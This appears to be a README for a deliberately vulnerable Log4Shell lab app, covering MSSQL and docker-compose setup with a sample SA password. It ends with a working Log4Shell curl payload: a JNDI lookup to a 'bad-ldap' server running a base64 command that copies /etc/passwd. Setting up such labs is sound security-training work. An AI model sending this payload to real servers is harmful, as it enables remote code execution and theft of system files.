# Requirements
 - Requires a MSSQL server with database name aoc
# Setup
## Setup DB
https://linoxide.com/install-ms-sql-server-on-ubuntu/
https://www.sqlshack.com/working-sql-server-command-line-sqlcmd/

root@mssql-server sqlcmd -S localhost -U SA -P 'P@55w0rd!'

CREATE DATABASE aoc
ON (
  NAME = aoc_dat,
  FILENAME = '/var/opt/mssql/data/aoc.mdf'
)
LOG ON (
  NAME = aoc_log,
  FILENAME = '/var/opt/mssql/log/aoc.ldf'
)
go

## Connect to db
 - Go to src/main/resources/application.properties
 - Change the following :
 - ``` 
   spring.datasource.url=jdbc:sqlserver://`database IP`;databaseName=aoc
   spring.datasource.username=`database user`
   spring.datasource.password=`database user password`
   ```
## Setup & Add Seed data to db
 - If you want to drop/create/seed the applications data table
 - Go to src/main/java/git/grimwolf007/exploits/Log4shellApplication.java and uncomment the info in the override block
   - ```
     	@Override
	   	public void run(String... args) throws Exception {
	   		try {
	   			//dropTable();
	   		} catch (Exception IllegalStateException) {
	   			System.out.println("Table is already Dropped.");
	   		}
	   		//createTable();
	   		// addMRs();
	   		listMRs();
	   	}
      ```
# Run
docker-compose build
docker-compose up

# Exploit
## /bin/cat /etc/passwd > /tmp/pwned
```
curl 127.0.0.1:8080/api -H 'X-Api-Version: ${jndi:ldap://bad-ldap:1389/Basic/Command/Base64/L2Jpbi9jYXQgL2V0Yy9wYXNzd2QgPiAvdG1wL3B3bmVk}'
```
